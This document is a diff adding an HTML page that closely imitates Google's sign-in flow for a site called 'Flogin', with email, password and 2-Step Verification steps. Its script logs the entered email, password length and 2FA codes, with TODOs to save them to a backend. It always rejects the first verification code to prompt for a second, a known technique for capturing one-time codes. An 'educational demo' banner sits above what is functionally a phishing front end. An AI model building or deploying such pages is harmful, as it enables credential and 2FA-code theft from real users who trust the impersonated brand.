@@ -1,0 +1,589 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Flogin - Google Login Replica</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        'google-blue': '#4285f4',
+                        'google-red': '#ea4335',
+                        'google-yellow': '#fbbc05',
+                        'google-green': '#34a853',
+                        'google-gray': '#5f6368',
+                        'google-gray-light': '#f8f9fa',
+                        'google-border': '#dadce0',
+                    },
+                    fontFamily: {
+                        'product-sans': ['Product Sans', 'Roboto', 'Arial', 'sans-serif'],
+                        'roboto': ['Roboto', 'Arial', 'sans-serif'],
+                    }
+                }
+            }
+        };
+    </script>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Product+Sans:wght@400;500;700&display=swap');
+        
+        .google-button {
+            transition: background-color 0.15s ease-in-out, border-color 0.15s ease-in-out, box-shadow 0.15s ease-in-out;
+        }
+        
+        .google-button:hover {
+            background-color: #1a73e8;
+            box-shadow: 0 1px 2px 0 rgba(66, 133, 244, .3), 0 1px 3px 1px rgba(66, 133, 244, .15);
+        }
+        
+        .google-button:focus {
+            background-color: #1a73e8;
+            box-shadow: 0 1px 2px 0 rgba(66, 133, 244, .3), 0 1px 3px 1px rgba(66, 133, 244, .15);
+            outline: none;
+        }
+        
+        .input-field {
+            transition: border-color 0.15s ease-in-out, box-shadow 0.15s ease-in-out;
+        }
+        
+        .input-field:focus {
+            border-color: #4285f4;
+            box-shadow: inset 0 1px 2px rgba(66, 133, 244, .3);
+            outline: none;
+        }
+        
+        .error-shake {
+            animation: shake 0.3s ease-in-out;
+        }
+        
+        @keyframes shake {
+            0%, 50%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-5px); }
+            75% { transform: translateX(5px); }
+        }
+    </style>
+</head>
+<body class="min-h-screen bg-white font-roboto">
+    <!-- @COMPONENT: App [main application container] -->
+    <div class="min-h-screen flex flex-col">
+        <!-- Educational Disclaimer Banner -->
+        <div class="bg-red-50 border-b border-red-200 p-3">
+            <div class="max-w-4xl mx-auto">
+                <p class="text-sm text-red-800 text-center">
+                    <span class="font-medium">⚠️ EDUCATIONAL DEMO:</span> 
+                    This is a replica interface for educational purposes only. Do not enter real credentials.
+                </p>
+            </div>
+        </div>
+
+        <!-- Main Content -->
+        <div class="flex-1 flex items-center justify-center p-4 bg-white">
+            <div class="w-full max-w-md">
+                <!-- @COMPONENT: LoginCard [main login container] -->
+                <div class="bg-white border border-google-border rounded-lg p-12 shadow-sm" id="loginCard">
+                    <!-- Google Logo -->
+                    <div class="flex justify-center mb-8">
+                        <!-- Exact Google Logo with precise colors -->
+                        <svg width="75" height="24" viewBox="0 0 272 92" xmlns="http://www.w3.org/2000/svg">
+                            <g fill="none" fill-rule="evenodd">
+                                <!-- G -->
+                                <path d="M115.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18C71.25 34.32 81.24 25 93.5 25s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44S80.99 39.2 80.99 47.18c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z" fill="#EA4335"/>
+                                <!-- o -->
+                                <path d="M163.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18c0-12.85 9.99-22.18 22.25-22.18s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44s-12.51 5.46-12.51 13.44c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z" fill="#FBBC05"/>
+                                <!-- o -->
+                                <path d="M209.75 26.34v39.82c0 16.38-9.66 23.07-21.08 23.07-10.75 0-17.22-7.19-19.66-13.07l8.48-3.53c1.51 3.61 5.21 7.87 11.17 7.87 7.31 0 11.84-4.51 11.84-13v-3.19h-.34c-2.18 2.69-6.38 5.04-11.68 5.04-11.09 0-21.25-9.66-21.25-22.09 0-12.52 10.16-22.26 21.25-22.26 5.29 0 9.49 2.35 11.68 4.96h.34v-3.61h9.25zm-8.56 20.92c0-7.81-5.21-13.52-11.84-13.52-6.72 0-12.35 5.71-12.35 13.52 0 7.73 5.63 13.36 12.35 13.36 6.63 0 11.84-5.63 11.84-13.36z" fill="#34A853"/>
+                                <!-- l -->
+                                <path d="M225 3v65h-9.5V3h9.5z" fill="#34A853"/>
+                                <!-- e -->
+                                <path d="M262.02 54.48l7.56 5.04c-2.44 3.61-8.32 9.83-18.48 9.83-12.6 0-22.01-9.74-22.01-22.18 0-13.19 9.49-22.18 20.92-22.18 11.51 0 17.14 9.16 18.98 14.11l1.01 2.52-29.65 12.28c2.27 4.45 5.8 6.72 10.75 6.72 4.96 0 8.4-2.44 10.92-6.14zm-23.27-7.98l19.82-8.23c-1.09-2.77-4.37-4.7-8.23-4.7-4.95 0-11.84 4.37-11.59 12.93z" fill="#EA4335"/>
+                            </g>
+                        </svg>
+                    </div>
+
+                    <!-- Step 1: Email Input -->
+                    <!-- @COMPONENT: EmailStep [email input form] -->
+                    <div id="emailStep" class="step-container">
+                        <h1 class="text-2xl font-product-sans font-normal text-gray-800 mb-2">Sign in</h1>
+                        <p class="text-sm text-gray-600 mb-8">to continue to Flogin</p>
+
+                        <form id="emailForm" class="space-y-6">
+                            <div>
+                                <input 
+                                    type="email" 
+                                    id="emailInput"
+                                    data-bind="user.email"
+                                    placeholder="Email or phone" 
+                                    class="input-field w-full px-4 py-3 border border-gray-300 rounded-md text-base focus:border-google-blue"
+                                    required
+                                >
+                                <div id="emailError" class="text-sm text-google-red mt-1 hidden">
+                                    <span data-mock="true">Enter a valid email or phone number</span>
+                                </div>
+                            </div>
+
+                            <div class="text-left">
+                                <button 
+                                    type="button"
+                                    data-event="click:handleForgotEmail"
+                                    class="text-sm text-google-blue hover:underline font-medium"
+                                >
+                                    Forgot email?
+                                </button>
+                            </div>
+
+                            <p class="text-sm text-google-gray">
+                                Not your computer? Use Guest mode to sign in privately.
+                                <button type="button" class="text-google-blue hover:underline ml-1">Learn more</button>
+                            </p>
+
+                            <div class="flex justify-between items-center pt-4">
+                                <button 
+                                    type="button"
+                                    class="text-sm text-google-blue font-medium hover:underline"
+                                >
+                                    Create account
+                                </button>
+                                
+                                <button 
+                                    type="submit"
+                                    data-event="click:handleEmailNext"
+                                    class="google-button bg-google-blue text-white px-6 py-2 rounded-md font-medium text-sm"
+                                >
+                                    Next
+                                </button>
+                            </div>
+                        </form>
+                    </div>
+                    <!-- @END_COMPONENT: EmailStep -->
+
+                    <!-- Step 2: Password Input -->
+                    <!-- @COMPONENT: PasswordStep [password input form] -->
+                    <div id="passwordStep" class="step-container hidden">
+                        <div class="flex items-center mb-6">
+                            <button 
+                                id="backToEmail" 
+                                data-event="click:goBackToEmail"
+                                class="mr-4 p-1 hover:bg-gray-100 rounded"
+                            >
+                                <svg class="w-5 h-5 text-google-gray" fill="currentColor" viewBox="0 0 20 20">
+                                    <path fill-rule="evenodd" d="M7.707 14.707a1 1 0 01-1.414 0L2.586 11a2 2 0 010-2.828L6.293 4.465a1 1 0 011.414 1.414L4.414 9.172a.5.5 0 000 .656l3.293 3.293a1 1 0 010 1.414z" clip-rule="evenodd"/>
+                                </svg>
+                            </button>
+                            <div>
+                                <!-- Google Logo Small -->
+                                <svg width="50" height="16" viewBox="0 0 272 92" xmlns="http://www.w3.org/2000/svg" class="mb-1">
+                                    <g fill="none" fill-rule="evenodd">
+                                        <path d="M115.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18C71.25 34.32 81.24 25 93.5 25s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44S80.99 39.2 80.99 47.18c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z" fill="#EA4335"/>
+                                        <path d="M163.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18c0-12.85 9.99-22.18 22.25-22.18s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44s-12.51 5.46-12.51 13.44c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z" fill="#FBBC05"/>
+                                        <path d="M209.75 26.34v39.82c0 16.38-9.66 23.07-21.08 23.07-10.75 0-17.22-7.19-19.66-13.07l8.48-3.53c1.51 3.61 5.21 7.87 11.17 7.87 7.31 0 11.84-4.51 11.84-13v-3.19h-.34c-2.18 2.69-6.38 5.04-11.68 5.04-11.09 0-21.25-9.66-21.25-22.09 0-12.52 10.16-22.26 21.25-22.26 5.29 0 9.49 2.35 11.68 4.96h.34v-3.61h9.25zm-8.56 20.92c0-7.81-5.21-13.52-11.84-13.52-6.72 0-12.35 5.71-12.35 13.52 0 7.73 5.63 13.36 12.35 13.36 6.63 0 11.84-5.63 11.84-13.36z" fill="#34A853"/>
+                                        <path d="M225 3v65h-9.5V3h9.5z" fill="#34A853"/>
+                                        <path d="M262.02 54.48l7.56 5.04c-2.44 3.61-8.32 9.83-18.48 9.83-12.6 0-22.01-9.74-22.01-22.18 0-13.19 9.49-22.18 20.92-22.18 11.51 0 17.14 9.16 18.98 14.11l1.01 2.52-29.65 12.28c2.27 4.45 5.8 6.72 10.75 6.72 4.96 0 8.4-2.44 10.92-6.14zm-23.27-7.98l19.82-8.23c-1.09-2.77-4.37-4.7-8.23-4.7-4.95 0-11.84 4.37-11.59 12.93z" fill="#EA4335"/>
+                                    </g>
+                                </svg>
+                            </div>
+                        </div>
+
+                        <h1 class="text-2xl font-product-sans font-normal text-gray-800 mb-2">Welcome</h1>
+                        <div class="flex items-center mb-8">
+                            <span id="userEmail" class="text-sm text-google-gray" data-bind="user.email">user@example.com</span>
+                            <button class="ml-2 text-google-blue text-sm hover:underline">Switch account</button>
+                        </div>
+
+                        <form id="passwordForm" class="space-y-6">
+                            <div class="relative">
+                                <input 
+                                    type="password" 
+                                    id="passwordInput"
+                                    data-bind="user.password"
+                                    placeholder="Enter your password" 
+                                    class="input-field w-full px-4 py-3 pr-12 border border-gray-300 rounded-md text-base focus:border-google-blue"
+                                    required
+                                >
+                                <button 
+                                    type="button" 
+                                    id="togglePassword"
+                                    data-event="click:togglePasswordVisibility"
+                                    class="absolute right-3 top-1/2 transform -translate-y-1/2 text-google-gray hover:text-gray-800"
+                                >
+                                    <svg id="showIcon" class="w-5 h-5" fill="currentColor" viewBox="0 0 20 20">
+                                        <path d="M10 12a2 2 0 100-4 2 2 0 000 4z"/>
+                                        <path fill-rule="evenodd" d="M10 2C5.582 2 2 5.582 2 10s3.582 8 8 8 8-3.582 8-8-3.582-8-8-8zM10 4a6 6 0 100 12 6 6 0 000-12z" clip-rule="evenodd"/>
+                                    </svg>
+                                    <svg id="hideIcon" class="w-5 h-5 hidden" fill="currentColor" viewBox="0 0 20 20">
+                                        <path fill-rule="evenodd" d="M3.707 2.293a1 1 0 00-1.414 1.414l14 14a1 1 0 001.414-1.414l-1.473-1.473A10.014 10.014 0 0019.542 10C18.268 5.943 14.478 3 10 3a9.958 9.958 0 00-4.512 1.074l-1.78-1.781zm4.261 4.26l1.514 1.515a2.003 2.003 0 012.45 2.45l1.514 1.514a4 4 0 00-5.478-5.478z" clip-rule="evenodd"/>
+                                    </svg>
+                                </button>
+                            </div>
+
+                            <div class="text-left">
+                                <button 
+                                    type="button"
+                                    id="forgotPasswordBtn"
+                                    data-event="click:handleForgotPassword"
+                                    class="text-sm text-google-blue hover:underline font-medium"
+                                >
+                                    Forgot password?
+                                </button>
+                            </div>
+
+                            <div class="flex items-center">
+                                <input type="checkbox" id="staySignedIn" class="mr-3">
+                                <label for="staySignedIn" class="text-sm text-google-gray">Stay signed in</label>
+                            </div>
+
+                            <div class="flex justify-end pt-4">
+                                <button 
+                                    type="submit"
+                                    data-event="click:handlePasswordNext"
+                                    class="google-button bg-google-blue text-white px-6 py-2 rounded-md font-medium text-sm"
+                                >
+                                    Next
+                                </button>
+                            </div>
+                        </form>
+                    </div>
+                    <!-- @END_COMPONENT: PasswordStep -->
+
+                    <!-- Step 3: 2FA Code Input -->
+                    <!-- @COMPONENT: TwoFactorStep [2FA verification form] -->
+                    <div id="twoFactorStep" class="step-container hidden">
+                        <div class="flex items-center mb-6">
+                            <button 
+                                id="backToPassword" 
+                                data-event="click:goBackToPassword"
+                                class="mr-4 p-1 hover:bg-gray-100 rounded"
+                            >
+                                <svg class="w-5 h-5 text-google-gray" fill="currentColor" viewBox="0 0 20 20">
+                                    <path fill-rule="evenodd" d="M7.707 14.707a1 1 0 01-1.414 0L2.586 11a2 2 0 010-2.828L6.293 4.465a1 1 0 011.414 1.414L4.414 9.172a.5.5 0 000 .656l3.293 3.293a1 1 0 010 1.414z" clip-rule="evenodd"/>
+                                </svg>
+                            </button>
+                        </div>
+
+                        <h1 class="text-2xl font-product-sans font-normal text-gray-800 mb-6">2-Step Verification</h1>
+                        
+                        <div class="mb-6">
+                            <p class="text-sm text-google-gray mb-4">
+                                To help keep your account safe, Google wants to make sure it's really you trying to sign in
+                            </p>
+                            
+                            <div class="flex items-center p-3 bg-gray-50 rounded-lg mb-4">
+                                <div class="w-8 h-8 bg-google-blue rounded-full flex items-center justify-center mr-3">
+                                    <svg class="w-4 h-4 text-white" fill="currentColor" viewBox="0 0 20 20">
+                                        <path d="M2 3a1 1 0 011-1h2.153a1 1 0 01.986.836l.74 4.435a1 1 0 01-.54 1.06l-1.548.773a11.037 11.037 0 006.105 6.105l.774-1.548a1 1 0 011.059-.54l4.435.74a1 1 0 01.836.986V17a1 1 0 01-1 1h-2C7.82 18 2 12.18 2 5V3z"/>
+                                    </svg>
+                                </div>
+                                <div>
+                                    <p class="text-sm font-medium text-gray-800" data-bind="user.phone">Text message to •••• •••• 1234</p>
+                                    <p class="text-xs text-google-gray">Standard rates may apply</p>
+                                </div>
+                            </div>
+                        </div>
+
+                        <form id="twoFactorForm" class="space-y-6">
+                            <div>
+                                <label class="block text-sm font-medium text-gray-700 mb-2">
+                                    Enter the code
+                                </label>
+                                <input 
+                                    type="text" 
+                                    id="codeInput"
+                                    data-bind="user.twoFactorCode"
+                                    placeholder="G-123456" 
+                                    maxlength="8"
+                                    class="input-field w-full px-4 py-3 border border-gray-300 rounded-md text-base focus:border-google-blue tracking-wider"
+                                    required
+                                >
+                                <div id="codeError" class="text-sm text-google-red mt-1 hidden">
+                                    <span data-mock="true">Please enter latest code sent</span>
+                                </div>
+                            </div>
+
+                            <div>
+                                <button 
+                                    type="button"
+                                    data-event="click:resendCode"
+                                    class="text-sm text-google-blue hover:underline font-medium"
+                                >
+                                    Resend code
+                                </button>
+                            </div>
+
+                            <div class="flex justify-end pt-4">
+                                <button 
+                                    type="submit"
+                                    data-event="click:handleCodeVerification"
+                                    class="google-button bg-google-blue text-white px-6 py-2 rounded-md font-medium text-sm"
+                                >
+                                    Verify
+                                </button>
+                            </div>
+                        </form>
+                    </div>
+                    <!-- @END_COMPONENT: TwoFactorStep -->
+
+                    <!-- Step 4: Success -->
+                    <!-- @COMPONENT: SuccessStep [login success confirmation] -->
+                    <div id="successStep" class="step-container hidden text-center">
+                        <div class="mb-6">
+                            <div class="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4">
+                                <svg class="w-8 h-8 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"/>
+                                </svg>
+                            </div>
+                        </div>
+
+                        <h1 class="text-2xl font-product-sans font-normal text-gray-800 mb-4">Welcome!</h1>
+                        <p class="text-sm text-google-gray mb-8">
+                            You have successfully signed in to Flogin.
+                        </p>
+
+                        <button 
+                            data-event="click:handleContinue"
+                            class="google-button bg-google-blue text-white px-8 py-2 rounded-md font-medium text-sm"
+                        >
+                            Continue
+                        </button>
+                    </div>
+                    <!-- @END_COMPONENT: SuccessStep -->
+
+                </div>
+                <!-- @END_COMPONENT: LoginCard -->
+
+                <!-- Footer -->
+                <div class="mt-8 flex flex-wrap justify-center items-center space-x-6 text-xs text-google-gray">
+                    <select class="bg-transparent border-none text-xs text-google-gray cursor-pointer">
+                        <option>English (United States)</option>
+                    </select>
+                    <button class="hover:underline">Help</button>
+                    <button class="hover:underline">Privacy</button>
+                    <button class="hover:underline">Terms</button>
+                </div>
+            </div>
+        </div>
+    </div>
+    <!-- @END_COMPONENT: App -->
+
+    <script>
+        (function() {
+            // TODO: Implement Node.js backend integration and JSON file logging
+            
+            // Mock login attempt logging data structure
+            const loginAttempts = [];
+            let currentStep = 1;
+            let attemptStartTime = Date.now();
+            let firstCodeAttempt = true;
+
+            // DOM elements
+            const emailStep = document.getElementById('emailStep');
+            const passwordStep = document.getElementById('passwordStep');
+            const twoFactorStep = document.getElementById('twoFactorStep');
+            const successStep = document.getElementById('successStep');
+            
+            const emailInput = document.getElementById('emailInput');
+            const passwordInput = document.getElementById('passwordInput');
+            const codeInput = document.getElementById('codeInput');
+            const userEmailDisplay = document.getElementById('userEmail');
+            
+            const emailError = document.getElementById('emailError');
+            const codeError = document.getElementById('codeError');
+
+            // Step navigation functions
+            function showStep(step) {
+                // Hide all steps
+                document.querySelectorAll('.step-container').forEach(el => el.classList.add('hidden'));
+                
+                // Show current step
+                switch(step) {
+                    case 1:
+                        emailStep.classList.remove('hidden');
+                        break;
+                    case 2:
+                        passwordStep.classList.remove('hidden');
+                        userEmailDisplay.textContent = emailInput.value;
+                        break;
+                    case 3:
+                        twoFactorStep.classList.remove('hidden');
+                        break;
+                    case 4:
+                        successStep.classList.remove('hidden');
+                        break;
+                }
+                currentStep = step;
+            }
+
+            // Email validation
+            function validateEmail(email) {
+                const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+                return emailRegex.test(email);
+            }
+
+            // Log attempt data (would save to JSON file in Node.js backend)
+            function logAttempt(stepData) {
+                const attemptData = {
+                    timestamp: new Date().toISOString(),
+                    step: currentStep,
+                    stepName: getStepName(currentStep),
+                    data: stepData,
+                    sessionId: 'sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9)
+                };
+                
+                loginAttempts.push(attemptData);
+                console.log('Login Attempt Logged:', attemptData);
+                // TODO: Send to Node.js backend to save in JSON file
+            }
+
+            function getStepName(step) {
+                const stepNames = {
+                    1: 'email_input',
+                    2: 'password_input', 
+                    3: 'two_factor_verification',
+                    4: 'login_success'
+                };
+                return stepNames[step] || 'unknown';
+            }
+
+            // Smart forgot password redirect based on email domain
+            function handleForgotPassword() {
+                const email = emailInput.value.toLowerCase();
+                let redirectUrl = '';
+
+                if (email.includes('@gmail.com')) {
+                    redirectUrl = 'https://accounts.google.com/signin/recovery';
+                } else if (email.includes('@yahoo.com')) {
+                    redirectUrl = 'https://login.yahoo.com/forgot';
+                } else if (email.includes('@outlook.com') || email.includes('@hotmail.com') || email.includes('@live.com')) {
+                    redirectUrl = 'https://account.live.com/password/reset';
+                } else {
+                    alert('Please contact your administrator to reset your password.');
+                    return;
+                }
+
+                logAttempt({ action: 'forgot_password_redirect', email: email, redirect_url: redirectUrl });
+                // TODO: Implement actual redirect in production
+                alert(`Would redirect to: ${redirectUrl}`);
+            }
+
+            // Event Listeners
+            document.getElementById('emailForm').addEventListener('submit', function(e) {
+                e.preventDefault();
+                const email = emailInput.value.trim();
+                
+                emailError.classList.add('hidden');
+                
+                if (!email) {
+                    emailError.textContent = 'Enter an email or phone number';
+                    emailError.classList.remove('hidden');
+                    emailInput.classList.add('error-shake');
+                    setTimeout(() => emailInput.classList.remove('error-shake'), 300);
+                    return;
+                }
+                
+                if (!validateEmail(email)) {
+                    emailError.textContent = 'Enter a valid email or phone number';
+                    emailError.classList.remove('hidden');
+                    emailInput.classList.add('error-shake');
+                    setTimeout(() => emailInput.classList.remove('error-shake'), 300);
+                    return;
+                }
+
+                logAttempt({ email: email });
+                showStep(2);
+            });
+
+            document.getElementById('passwordForm').addEventListener('submit', function(e) {
+                e.preventDefault();
+                const password = passwordInput.value;
+                
+                if (!password) {
+                    return;
+                }
+
+                logAttempt({ email: emailInput.value, password_length: password.length });
+                showStep(3);
+            });
+
+            document.getElementById('twoFactorForm').addEventListener('submit', function(e) {
+                e.preventDefault();
+                const code = codeInput.value.trim();
+                
+                codeError.classList.add('hidden');
+                
+                if (!code) {
+                    return;
+                }
+
+                if (firstCodeAttempt) {
+                    // First attempt - show error
+                    codeError.classList.remove('hidden');
+                    codeInput.classList.add('error-shake');
+                    setTimeout(() => codeInput.classList.remove('error-shake'), 300);
+                    logAttempt({ two_factor_code: code, attempt: 'first', result: 'error' });
+                    firstCodeAttempt = false;
+                    codeInput.value = '';
+                } else {
+                    // Second attempt - success
+                    logAttempt({ two_factor_code: code, attempt: 'second', result: 'success' });
+                    showStep(4);
+                }
+            });
+
+            // Back navigation
+            document.getElementById('backToEmail').addEventListener('click', () => showStep(1));
+            document.getElementById('backToPassword').addEventListener('click', () => showStep(2));
+
+            // Password toggle
+            document.getElementById('togglePassword').addEventListener('click', function() {
+                const passwordField = document.getElementById('passwordInput');
+                const showIcon = document.getElementById('showIcon');
+                const hideIcon = document.getElementById('hideIcon');
+                
+                if (passwordField.type === 'password') {
+                    passwordField.type = 'text';
+                    showIcon.classList.add('hidden');
+                    hideIcon.classList.remove('hidden');
+                } else {
+                    passwordField.type = 'password';
+                    showIcon.classList.remove('hidden');
+                    hideIcon.classList.add('hidden');
+                }
+            });
+
+            // Forgot password button
+            document.getElementById('forgotPasswordBtn').addEventListener('click', handleForgotPassword);
+
+            // Resend code
+            document.querySelector('[data-event="click:resendCode"]').addEventListener('click', function() {
+                logAttempt({ action: 'resend_code' });
+                alert('Verification code sent!');
+            });
+
+            // Initialize
+            showStep(1);
+            
+            // Auto-focus inputs when steps change
+            const observer = new MutationObserver(function(mutations) {
+                mutations.forEach(function(mutation) {
+                    if (mutation.type === 'attributes' && mutation.attributeName === 'class') {
+                        const target = mutation.target;
+                        if (!target.classList.contains('hidden')) {
+                            const input = target.querySelector('input[type="email"], input[type="password"], input[type="text"]');
+                            if (input) {
+                                setTimeout(() => input.focus(), 100);
+                            }
+                        }
+                    }
+                });
+            });
+
+            document.querySelectorAll('.step-container').forEach(el => {
+                observer.observe(el, { attributes: true });
+            });
+        })();
+    </script>
+</body>
+</html>
